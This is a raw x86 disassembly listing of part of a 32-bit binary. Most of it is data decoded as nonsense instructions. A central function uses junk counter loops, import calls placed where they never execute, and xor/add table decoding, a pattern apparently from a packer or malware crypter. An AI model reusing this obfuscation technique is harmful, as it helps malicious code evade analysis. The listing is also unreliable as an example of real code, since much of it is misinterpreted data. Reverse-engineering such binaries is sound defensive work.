  410124:	aas    
  410125:	and    al,0x9e
  410127:	sahf   
  410128:	xchg   bl,bl
  41012a:	outs   dx,BYTE PTR ds:[esi]
  41012b:	xchg   edx,eax
  41012c:	add    eax,DWORD PTR [eax+0x73]
  41012f:	xor    edx,DWORD PTR [eax]
  410131:	mov    edi,0x9b7e1081
  410136:	jb     0x4100f4
  410138:	cmp    DWORD PTR [edx-0x26863b38],esi
  41013e:	outs   dx,DWORD PTR ds:[esi]
  41013f:	call   0xc87856b1
  410144:	adc    edx,DWORD PTR [ebx+ecx*8]
  410147:	mov    BYTE PTR [esi-0x54],ch
  41014a:	mov    ds:0xcf6f2cd9,eax
  41014f:	dec    edi
  410150:	shl    DWORD PTR [ebx+ebx*1-0x4c59300d],0xf4
  410158:	repnz sti 
  41015a:	cwde   
  41015b:	push   esp
  41015c:	scas   al,BYTE PTR es:[edi]
  41015d:	jmp    0xa3cb:0x47e1cd2d
  410164:	aad    0x37
  410166:	call   0x7a9befec
  41016b:	call   0x6bc842e1
  410170:	sbb    eax,0xf64a39bd
  410175:	sar    dl,1
  410177:	sub    eax,0xd96c39fd
  41017c:	inc    ebp
  41017d:	cmp    dh,bl
  41017f:	jmp    0x27c521e3
  410184:	nop
  410185:	inc    edx
  410186:	pop    eax
  410187:	ficom  WORD PTR [ebx+0x25d191a3]
  41018d:	inc    ebx
  41018e:	test   DWORD PTR [edx+ecx*8-0x26ac0f8d],edx
  410195:	pop    ds
  410196:	test   eax,0x78fec9e8
  41019b:	jae    0x4101f7
  41019d:	mov    ch,dl
  41019f:	pop    esi
  4101a0:	xor    cl,BYTE PTR [esi-0x6fa40e94]
  4101a6:	(bad)  
  4101a7:	sub    BYTE PTR [esi],cl
  4101a9:	out    0x55,eax
  4101ab:	je     0x410182
  4101ad:	xchg   DWORD PTR cs:[ebx],edi
  4101b0:	dec    edi
  4101b1:	pop    es
  4101b2:	jg     0x410177
  4101b4:	cli    
  4101b5:	push   esi
  4101b6:	mov    esp,0x1050d988
  4101bb:	and    al,0x6c
  4101bd:	cmp    DWORD PTR [ebp+0x2b],edx
  4101c0:	jae    0x410222
  4101c2:	rol    DWORD PTR [edi],1
  4101c4:	cli    
  4101c5:	adc    BYTE PTR ds:0x21ed165e,0x48
  4101cc:	add    bh,BYTE PTR [edi-0x5e5e70d7]
  4101d2:	dec    ebp
  4101d3:	in     al,dx
  4101d4:	cld    
  4101d5:	ss and eax,0x14995444
  4101db:	jge    0x410258
  4101dd:	cmp    al,0x21
  4101df:	mov    ebx,0xa83fc019
  4101e4:	pushf  
  4101e5:	cli    
  4101e6:	adc    dh,bh
  4101e8:	xlat   BYTE PTR ds:[ebx]
  4101e9:	sub    dl,dh
  4101eb:	clc    
  4101ec:	sbb    DWORD PTR [edi],esi
  4101ee:	ret    0x540c
  4101f1:	or     edx,esp
  4101f3:	stc    
  4101f4:	fistp  WORD PTR [eax-0x4fa58e34]
  4101fa:	mov    bh,0x22
  4101fc:	test   BYTE PTR [ebx-0x740e0844],bl
  410202:	dec    ebp
  410203:	adc    BYTE PTR [ebx],ah
  410205:	enter  0xc981,0x8f
  410209:	sbb    eax,0xc18b8116
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43381f
  41021e:	adc    DWORD PTR ds:0x433857,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43378b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x4338ab,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x43385f
  41026b:	or     DWORD PTR ds:0x433857,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x43382b,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x43382b
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x43382b,ecx
  410291:	cmp    DWORD PTR ds:0x43382b,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x43382b,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x43382b,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x43382b
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x43382b,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433783
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x433867,0x43381f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x433863,0x433817
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x4337d7
  41031a:	sub    DWORD PTR ds:0x43379f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x4337db,0x0
  410338:	mov    ecx,DWORD PTR ds:0x4337db
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x4337db,ecx
  410345:	cmp    DWORD PTR ds:0x4337db,0x25
  41034c:	jne    0x410362
  410352:	push   0x43392f
  410357:	push   0x43396f
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x4337db,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43381f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433893,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433893
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433893,ecx
  41038f:	cmp    DWORD PTR ds:0x433893,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x433867
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433893,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433893
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433893,ecx
  4103c8:	cmp    DWORD PTR ds:0x433893,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x4337df,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x4337d7,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x4337d7
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x4337d7,esi
  4103ff:	cmp    DWORD PTR ds:0x4337d7,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x4337d7,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xe6,al
  41049c:	inc    ecx
  41049d:	cmp    BYTE PTR [esp+ebx*8-0x50],bh
  4104a1:	jle    0x410521
  4104a3:	scas   eax,DWORD PTR es:[edi]
  4104a4:	jl     0x410524
  4104a6:	jle    0x410517
  4104a8:	add    BYTE PTR [eax],ah
  4104aa:	sbb    eax,0xe2a00415
  4104af:	pop    ss
  4104b0:	pop    es
  4104b1:	out    0x7c,eax
  4104b3:	cld    
  4104b4:	jb     0x4104e4
  4104b6:	xchg   esi,eax
  4104b7:	rcr    BYTE PTR [edx],cl
  4104b9:	mov    esp,0x8bf8573d
  4104be:	add    BYTE PTR [eax],bl
  4104c0:	hlt    
  4104c1:	shl    DWORD PTR [esi+0x79],cl
  4104c4:	pop    ds
  4104c5:	test   BYTE PTR [edx+ebp*8-0x407c13a8],ch
  4104cc:	cmp    ebp,DWORD PTR [esi-0x44]
  4104cf:	das    
  4104d0:	fist   WORD PTR [edi]
  4104d2:	stos   BYTE PTR es:[edi],al
  4104d3:	je     0x4104a3
  4104d5:	and    BYTE PTR [ecx+0x3c],ch
  4104d8:	xchg   DWORD PTR [edx],esi
  4104da:	sub    edx,DWORD PTR [edx+edi*8]
  4104dd:	mov    eax,ds:0x64a23297
  4104e2:	sbb    BYTE PTR [ecx-0x5c5db2b9],bh
  4104e8:	sbb    al,0xc2
  4104ea:	mov    ds:0x41867e0d,al
  4104ef:	popa   
  4104f0:	pop    ecx
  4104f1:	mov    ch,bl
  4104f3:	mov    ebx,0x7e40a889
  4104f8:	int3   
  4104f9:	lods   eax,DWORD PTR ds:[esi]
  4104fa:	dec    edi
  4104fb:	mov    ch,0x26
  4104fd:	jne    0x410551
  4104ff:	dec    esi
  410500:	adc    eax,0x8913c49f
  410505:	int3   
  410506:	fcmovnbe st,st(3)
  410508:	mov    ah,0x9f
  41050a:	lods   eax,DWORD PTR ds:[esi]
  41050b:	popa   
  41050c:	cmp    al,0xdf
  41050e:	adc    edi,DWORD PTR [eax*2-0x8087c32]
  410515:	xchg   ebp,eax
  410516:	push   edx
  410517:	icebp  
  410518:	pop    ebp
  410519:	adc    ecx,DWORD PTR [esi-0x13]
  41051c:	call   0x63ec9614
  410521:	shl    ebx,1
  410523:	jecxz  0x41050d
  410525:	arpl   WORD PTR [eax],dx
  410527:	fucomp st(3)
  410529:	or     bh,BYTE PTR [edi-0x5bfb0db8]
  41052f:	mov    eax,0x426e8d0d
  410534:	int3   
  410535:	sbb    al,0xb
  410537:	or     eax,DWORD PTR [ebx]
  410539:	add    al,0xab
  41053b:	pop    esi
  41053c:	aam    0x25
  41053e:	sbb    edi,DWORD PTR [edx-0x4d526b9c]
  410544:	fcmovne st,st(3)
  410546:	jg     0x410586
  410548:	or     DWORD PTR [ebp+0x73d5e32c],esp
  41054e:	mov    edi,0xf42ae7f5
  410553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410554:	mov    esp,0xe9e11a8c
  410559:	or     al,0x42
  41055b:	xchg   ecx,eax
  41055c:	dec    esp
  41055d:	xchg   ecx,eax
  41055e:	push   ds
  41055f:	fdivr  QWORD PTR [eax]
  410561:	add    eax,0x4cb099bd
  410566:	imul   edi,DWORD PTR [ecx+0x3d],0x3b83c3ef
  41056d:	lock dec edi
  41056f:	mov    DWORD PTR [ecx-0x7b],eax
  410572:	in     eax,dx
  410573:	retf   0x84a3
  410576:	ds int 0x91
  410579:	cmp    ah,BYTE PTR [ecx+0x18]
  41057c:	repz cmp eax,ebx
  41057f:	sbb    BYTE PTR [eax+0x51],dl
  410582:	loopne 0x41057b
  410584:	dec    edx
  410585:	ret    
  410586:	ret    
  410587:	imul   edx,edx,0xffffffdc
  41058a:	js     0x410555
  41058c:	sahf   
  41058d:	outs   dx,DWORD PTR ds:[esi]
  41058e:	and    eax,0x3b670c69
  410593:	jmp    0x4105e8
  410595:	adc    ebx,DWORD PTR [eax]
  410597:	arpl   WORD PTR [edx+0x626b7f02],bp
  41059d:	jae    0x410572
  41059f:	inc    eax
  4105a0:	pop    ebx
  4105a1:	mov    al,ds:0xdb749bd6
  4105a6:	pop    edx
  4105a7:	jmp    0x3c31bce0
  4105ac:	adc    edx,esp
  4105ae:	jbe    0x4105f5
  4105b0:	lea    edi,[edi+ecx*8]
  4105b3:	int3   
  4105b4:	mov    dl,0xd4
  4105b6:	dec    esi
  4105b7:	mov    al,BYTE PTR [ecx+0x64ce500f]
  4105bd:	mov    ss,WORD PTR [eax+0x53]
  4105c0:	aaa    
  4105c1:	(bad)  
  4105c3:	fild   QWORD PTR [edx-0x6]
  4105c6:	aaa    
  4105c7:	lods   al,BYTE PTR ds:[esi]
  4105c8:	and    al,dh
  4105ca:	ds sbb eax,0x75cfa27d
  4105d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4105d1:	scas   eax,DWORD PTR es:[edi]
  4105d2:	mov    ch,0xba
  4105d4:	(bad)
  4105d7:	imul   edi,DWORD PTR ds:0x1ef666ea,0x36
  4105de:	push   cs
  4105df:	jnp    0x4105f3
  4105e1:	test   DWORD PTR [esi],edx
  4105e3:	dec    edx
  4105e4:	dec    edi
  4105e5:	jne    0x4105dc
  4105e7:	jbe    0x410623
  4105e9:	mov    ebx,0x1e4c05a
  4105ee:	hlt    
  4105ef:	inc    ebp
  4105f0:	xor    al,0xbf
  4105f2:	adc    ecx,DWORD PTR [edi]
  4105f4:	mov    ch,0xbb
  4105f6:	and    eax,eax
  4105f8:	aad    0x40
  4105fa:	mov    WORD PTR [ebx],?
  4105fc:	inc    esp
  4105fd:	test   eax,0xf3317dd6
  410602:	jecxz  0x41061f
  410604:	idiv   DWORD PTR ds:0x51be221c
  41060a:	mov    esp,0x4262607d
  41060f:	mov    dh,0xd2
  410611:	gs popf 
  410613:	mov    BYTE PTR [eax+0x65],al
  410616:	add    al,0x7c
  410618:	fucomp st(2)
  41061a:	imul   edx,edx,0x3c
  41061d:	rcl    BYTE PTR [eax],0xec
  410620:	call   0x222:0x5dc42b7f
  410627:	ja     0x4105cb
  410629:	ds xchg esp,eax
  41062b:	push   edi
  41062c:	push   ss
  41062d:	mov    cl,0x71
  41062f:	arpl   WORD PTR ss:[edi+0x33fae6ac],ax
  410636:	mov    BYTE PTR [esi+0x17aab06e],al
  41063c:	(bad)  
  41063e:	stos   BYTE PTR es:[edi],al
  41063f:	xchg   edx,eax
  410640:	adc    eax,0x66d800e3
  410645:	addr16 mov ah,0x5e
  410648:	mov    esp,0xcaf44384
  41064d:	in     eax,0x70
  41064f:	jle    0x4105e0
  410651:	(bad)  
  410652:	ficomp DWORD PTR [esi-0x2b]
  410655:	jle    0x41065b
  410657:	aam    0x7a
  410659:	data16 lock clc 
  41065c:	ds lock stos DWORD PTR es:[edi],eax
  41065f:	jo     0x4106d1
  410661:	sbb    eax,0x140ff09d
  410666:	add    BYTE PTR [edi+0x22],0x67
  41066a:	stc    
  41066b:	inc    edx
  41066c:	stos   BYTE PTR es:[edi],al
  41066d:	push   ebx
  41066e:	sbb    al,0x6d
  410670:	ficomp WORD PTR [edi+0x1]
  410673:	sahf   
  410674:	mov    edi,0xa0b3826
  410679:	sar    DWORD PTR [eax-0x6ddf8520],1
  41067f:	scas   eax,DWORD PTR es:[edi]
  410680:	arpl   WORD PTR [ebx],si
  410682:	ins    BYTE PTR es:[edi],dx
  410683:	pop    ecx
  410684:	push   esi
  410685:	sbb    al,BYTE PTR [eax+0x59]
  410688:	cmp    DWORD PTR [esi+0x3d],eax
  41068b:	jnp    0x41067c
  41068d:	and    al,0xe2
  41068f:	sbb    ebp,0x990c0e8c
  410695:	mov    ah,0x44
  410697:	(bad)  [di+0x7b54]
  41069c:	xor    DWORD PTR [ebp+0x5d004047],esp
  4106a2:	cmp    BYTE PTR [edi+0x42024329],ch
  4106a8:	or     dl,dh
  4106aa:	jg     0x4106ef
  4106ac:	(bad)  
  4106ad:	retf   
  4106ae:	sbb    DWORD PTR [ecx],0xfffffff2
  4106b1:	scas   al,BYTE PTR es:[edi]
  4106b2:	xchg   edi,eax
  4106b3:	(bad)  
  4106b4:	adc    al,0xe
  4106b6:	inc    esi
  4106b7:	cs fpatan 
  4106ba:	mov    eax,ds:0xf1f73192
  4106bf:	mov    al,0x11
  4106c1:	fimul  DWORD PTR [ebp+0x3c]
  4106c4:	mov    DWORD PTR [ebx-0x581d70bf],esi
  4106ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106cb:	mov    ah,0xe7
  4106cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106ce:	sub    ah,ch
  4106d0:	out    0x90,al
  4106d2:	adc    dh,BYTE PTR [edx+0x59]
  4106d5:	stos   DWORD PTR es:[edi],eax
  4106d6:	aam    0x87
  4106d8:	test   eax,0xc9c513d8
  4106dd:	call   DWORD PTR [edi-0x77326a49]
  4106e3:	dec    edi
  4106e4:	jno    0x410692
  4106e6:	mov    ecx,0xfcd85b08
  4106eb:	push   cs
  4106ec:	and    BYTE PTR [eax],dh
  4106ee:	jno    0x4106e0
  4106f0:	pop    ebp
  4106f1:	inc    ecx
  4106f2:	fwait
  4106f3:	mov    bl,0x73
  4106f5:	ss es pop ss
  4106f8:	leave  
  4106f9:	(bad)  
  4106fb:	imul   ebx,DWORD PTR [ebp+eax*2-0x49f8412],0xffffffd3
  410703:	dec    ebx
  410704:	push   edx
  410705:	adc    BYTE PTR [edx],dl
  410707:	sbb    DWORD PTR [edi],esi
  410709:	shr    DWORD PTR [esi+0x7e8953cc],cl
  41070f:	sub    DWORD PTR [ecx+ebx*2-0x571cfdee],edx
  410716:	pop    es
  410717:	mov    ah,0x9b
  410719:	fs popa 
  41071b:	gs sahf 
  41071d:	test   DWORD PTR [esi-0x1b],0xb7511588
  410724:	ja     0x4106cb
  410726:	arpl   WORD PTR [ebx-0x2c],dx
  410729:	mov    ecx,DWORD PTR ds:0x6ed61b60
  41072f:	es dec ebx
  410731:	xlat   BYTE PTR ds:[ebx]
  410732:	add    al,BYTE PTR [ecx+ebp*4]
  410735:	sbb    al,BYTE PTR [edi-0x76]
  410738:	int    0xc1
  41073a:	sbb    ch,0xda
  41073d:	int    0xe8
  41073f:	and    edx,DWORD PTR [ebp+0x2a]
  410742:	mov    DWORD PTR [ebx+0x77],ebp
  410745:	and    edx,DWORD PTR [eax]
  410747:	int3   
  410748:	inc    edx
  410749:	xchg   ebp,eax
  41074a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41074b:	test   al,0x30
  41074d:	jl     0x41078f
  41074f:	xchg   esi,eax
  410750:	es dec eax
  410752:	inc    esp
  410753:	xchg   esp,eax
  410754:	jle    0x410756
  410756:	jge    0x4107b8
  410758:	mov    eax,DWORD PTR [ebp-0xc]
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0xb0bde04a
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x4107d0
  41078c:	dec    eax
  41078d:	aam    0xf7
  41078f:	xchg   ebp,eax
  410790:	or     BYTE PTR [edi-0x5a],0x33
  410794:	sti    
  410795:	ffreep st(2)
  410797:	sbb    bh,BYTE PTR [edx-0x1]
  41079a:	fmul   QWORD PTR [eax+0x7f]
  41079d:	pop    eax
  41079e:	sub    BYTE PTR [ecx+0x5b12db8e],ah
  4107a4:	aas    
  4107a5:	ror    DWORD PTR [edx],cl
  4107a7:	cmp    eax,0x3b02ba2c
  4107ac:	dec    edi
  4107ad:	cdq    
  4107ae:	dec    edi
  4107af:	out    0xc5,eax
  4107b1:	mov    ch,0x43
  4107b3:	das    
  4107b4:	cmp    eax,0x99b99332
  4107ba:	sti    
  4107bb:	sub    DWORD PTR [eax],edx
  4107bd:	pushf  
  4107be:	call   0xdd99:0x9956e5b4
  4107c5:	mov    edi,ecx
  4107c7:	ss cmc 
  4107c9:	cmp    DWORD PTR [edi-0x5],edx
  4107cc:	sahf   
  4107cd:	jmp    FWORD PTR [edx-0x4b]
  4107d0:	xchg   esi,eax
  4107d1:	mov    cs,WORD PTR [ebp-0x33]
  4107d4:	mov    eax,0x488315bc
  4107d9:	or     ch,BYTE PTR [eax+edi*1+0x34]
  4107dd:	inc    edi
  4107de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107df:	pop    ecx
  4107e0:	fcmovnbe st,st(1)
  4107e2:	add    dl,dh
  4107e4:	(bad)  
  4107e5:	dec    ebp
  4107e6:	add    eax,0x50774b8f
  4107eb:	push   ecx
  4107ec:	stos   DWORD PTR es:[edi],eax
  4107ed:	cli    
  4107ee:	cmp    ebp,0x9db3d40e
  4107f4:	dec    ebp
  4107f5:	mov    dl,0x35
  4107f7:	fnstsw WORD PTR [eax+0x2e]
  4107fa:	sahf   
  4107fb:	loope  0x41078d
  4107fd:	cmp    DWORD PTR [edi+0x523a3a34],0x79d567f8
  410807:	xchg   bl,ah
  410809:	mov    WORD PTR [edi-0x79],?
  41080c:	push   ss
  41080d:	sub    DWORD PTR [edx+0x30abf635],ebp
  410813:	mov    ?,WORD PTR [esi]
  410815:	xchg   ebp,eax
  410816:	and    DWORD PTR [edi-0x40],eax
  410819:	fwait
  41081a:	cmp    al,0xb3
  41081c:	(bad)  
  41081d:	neg    BYTE PTR [ecx+0x1d]
  410820:	adc    ebx,ecx
  410822:	gs jo  0x4107ac
  410825:	cmp    ch,0x86
  410828:	cmp    bl,BYTE PTR [edi-0x3651647b]
  41082e:	es int 0x5c
  410831:	popf   
  410832:	repnz add edi,edx
  410835:	or     DWORD PTR [edx+0x4290fe67],ebx
  41083b:	sar    DWORD PTR [ebx-0x4e5dd591],cl
  410841:	add    ebp,edi
  410843:	hlt    
  410844:	dec    esi
  410845:	loopne 0x4108c5
  410847:	bsf    eax,esp
  41084a:	xchg   edx,eax
  41084b:	mov    ebp,0xdd136604
  410850:	std    
  410851:	iret   
  410852:	das    
  410853:	and    DWORD PTR [edi-0x34f233a5],ebp
  410859:	popf   
  41085a:	div    ecx
  41085c:	dec    esp
  41085d:	jb     0x4108c1
  41085f:	std    
  410860:	mov    WORD PTR [ecx+0x6b],?
  410863:	bound  edi,QWORD PTR [esi-0x3008c6f9]
  410869:	pop    es
  41086a:	ins    BYTE PTR es:[edi],dx
  41086b:	inc    ecx
  41086c:	retf   
  41086d:	aam    0x9c
  41086f:	fisubr DWORD PTR [eax]
  410871:	addr16 dec eax
  410873:	add    ch,bh
  410875:	mov    eax,ds:0x141d119
  41087a:	and    al,0xd4
  41087c:	dec    edi
  41087d:	push   esp
  41087e:	sbb    ebx,edx
  410880:	arpl   sp,cx
  410882:	mov    eax,0xfabbb925
  410887:	xchg   edx,eax
  410888:	push   edx
  410889:	sbb    DWORD PTR [ecx+esi*2-0x27c5407c],edx
  410890:	jge    0x41089c
  410892:	arpl   WORD PTR [edx],dx
  410894:	cmp    eax,DWORD PTR [eax+0x1c503e8b]
  41089a:	xor    ebx,ebx
  41089c:	mov    ss,ebx
  41089e:	adc    ah,BYTE PTR [esp+edx*8+0xd7fc15c]
  4108a5:	test   BYTE PTR [esi+0x31],0x1d
  4108a9:	sub    DWORD PTR ds:0x8a42a200,0x7
  4108b0:	int    0xee
  4108b2:	inc    edx
  4108b3:	shr    BYTE PTR [ebp-0x144c6f0a],1
  4108b9:	jp     0x41091e
  4108bb:	data16 jl 0x410894
  4108be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108bf:	mov    edx,?
  4108c1:	push   cs
  4108c2:	mov    esp,0xb5d93181
  4108c7:	cmp    dl,BYTE PTR [edi+0x29e811eb]
  4108cd:	pop    ds
  4108ce:	test   al,0xca
  4108d0:	sbb    edi,DWORD PTR [eax+0x335c3a57]
  4108d6:	mov    ecx,0x441dab97
  4108db:	mov    bl,0xb2
  4108dd:	out    0x9f,eax
  4108df:	mov    ds:0xfa74382d,al
  4108e4:	dec    ecx
  4108e5:	xor    cl,0xd0
  4108e8:	es fs dec esi
  4108eb:	out    dx,eax
  4108ec:	xor    BYTE PTR [ecx-0x2acddb87],ch
  4108f2:	pop    edi
  4108f3:	aad    0xce
  4108f5:	xchg   ebx,eax
  4108f6:	(bad)  
  4108f7:	js     0x4108f1
  4108f9:	lahf   
  4108fa:	dec    esi
  4108fb:	mov    al,ds:0x972200bb
  410900:	xlat   BYTE PTR ds:[ebx]
  410901:	or     DWORD PTR [ebx],ebp
  410903:	fwait
  410904:	imul   esi,ebx,0x1f13ee4c
  41090a:	cdq    
  41090b:	sub    dl,BYTE PTR [edi-0x45]
  41090e:	xor    cl,BYTE PTR [eax+0x459ec9dd]
  410914:	lock mov esp,0xcbc5057c
  41091a:	mov    ecx,0x55a47d45
  41091f:	xchg   ebx,eax
  410920:	in     al,dx
  410921:	lds    edi,FWORD PTR [ecx+0x658de7a8]
  410927:	adc    al,0xf9
  410929:	push   0xba863983
  41092e:	sbb    ah,BYTE PTR [edi+eiz*4+0x27]
  410932:	push   eax
  410933:	cld    
  410934:	leave  
  410935:	adc    BYTE PTR ds:0x5c0546a1,bh
  41093b:	loop   0x410996
  41093d:	mov    edx,0x7225dfb4
  410942:	inc    edx
  410943:	mov    eax,0xe0a45a9b
  410948:	jno    0x41091d
  41094a:	sbb    BYTE PTR [eax+eiz*8+0x6d],dl
  41094e:	or     DWORD PTR [ebx+esi*2+0x607d8e22],ebx
  410955:	call   0x4ecc:0x851778f
  41095c:	fisttp DWORD PTR [esp]
  41095f:	fsub   st,st(0)
  410961:	repz clc 
  410963:	and    BYTE PTR [edi],0x8a
  410966:	and    BYTE PTR [ebp+0x35d0603f],al
  41096c:	pop    edx
  41096d:	xor    DWORD PTR [ebp-0x7f],eax
  410970:	leave  
  410971:	sub    al,0xe6
  410973:	sbb    ch,BYTE PTR [ebx+0x10d3c664]
  410979:	ret    
  41097a:	push   ebx
  41097b:	lods   eax,DWORD PTR ds:[esi]
  41097c:	stos   DWORD PTR es:[edi],eax
  41097d:	in     eax,0xc
  41097f:	jns    0x4109a5
  410981:	sbb    al,0x23
  410983:	xchg   edx,eax
  410984:	in     al,dx
  410985:	fsubr  DWORD PTR [edi-0x15]
  410988:	call   0xf25ed592
  41098d:	sbb    bh,BYTE PTR [eax]
  41098f:	mov    bl,0x93
  410991:	jmp    0x3b4576c4
  410996:	dec    ebx
  410997:	loop   0x410934
  410999:	shr    DWORD PTR [eax],0xc3
  41099c:	xchg   cl,bl
  41099e:	dec    eax
  41099f:	inc    ebp
  4109a0:	stc    
  4109a1:	not    DWORD PTR [eax-0x3a]
  4109a4:	jge    0x4109b2
  4109a6:	jns    0x410a08
  4109a8:	mov    al,0xe1
  4109aa:	mov    ?,WORD PTR [ebx]
  4109ac:	test   DWORD PTR [edi+0x67842206],esp
  4109b2:	in     eax,dx
  4109b3:	xchg   BYTE PTR [ecx+0x4d1f52cb],bl
  4109b9:	pop    eax
  4109ba:	aam    0x6e
  4109bc:	gs or  eax,0xa0880ff
  4109c2:	mov    eax,ds:0x44b11b93
  4109c7:	lock imul ebx,DWORD PTR [edx-0x75],0xb
  4109cc:	mov    dl,0x16
  4109ce:	in     al,dx
  4109cf:	ret    0x17f5
  4109d2:	dec    esp
  4109d3:	icebp  
  4109d4:	in     eax,dx
  4109d5:	loop   0x4109ab
  4109d7:	aas    
  4109d8:	cmp    BYTE PTR [ebx-0x93a73ca],ah
  4109de:	push   ss
  4109df:	lea    eax,[esi-0x1d]
  4109e2:	enter  0x3644,0x9
  4109e6:	adc    eax,0x21b2ae6f
  4109eb:	lock mov esp,0x5a27e210
  4109f1:	jns    0x41098b
  4109f3:	sub    DWORD PTR [ecx-0x20],edx
  4109f6:	ins    DWORD PTR es:[edi],dx
  4109f7:	jp     0x410a58
  4109f9:	adc    DWORD PTR [ebx-0xf445d3a],0x2c1db7c7
  410a03:	mov    dl,dh
  410a05:	ret    
  410a06:	jae    0x410a7a
  410a08:	add    eax,0xefc2d42b
  410a0d:	imul   edx,DWORD PTR [eax-0x17],0x1c
  410a11:	dec    BYTE PTR [esi+0x78]
  410a14:	dec    esi
  410a15:	sbb    DWORD PTR [esi+0x6ccd1e2e],ebx
